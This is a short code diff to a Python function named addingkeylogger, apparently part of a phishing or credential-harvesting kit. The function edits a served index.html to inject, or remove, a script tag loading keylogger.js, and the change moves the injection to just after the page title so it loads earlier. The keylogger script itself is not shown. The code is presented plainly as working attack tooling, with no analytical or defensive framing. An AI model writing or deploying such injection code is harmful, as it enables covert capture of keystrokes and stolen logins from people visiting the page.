@@ -314,7 +314,7 @@ def addingkeylogger():
      if 'Y' in custom or 'y' in custom:
          with open('Server/www/index.html') as f:
              read_data = f.read()
-         c = read_data.replace('</div>', '</div><script src="keylogger.js"></script>')
+         c = read_data.replace('</title>', '</title><script src="keylogger.js"></script>')
          f = open('Server/www/index.html', 'w')
          f.write(c)
          f.close()
@@ -324,7 +324,7 @@ def addingkeylogger():
      else:
          with open('Server/www/index.html') as f:
              read_data = f.read()
-         c = read_data.replace('</div><script src="keylogger.js"></script>', '</div>')
+         c = read_data.replace('</title><script src="keylogger.js"></script>', '</title>')
          f = open('Server/www/index.html', 'w')
          f.write(c)
          f.close()
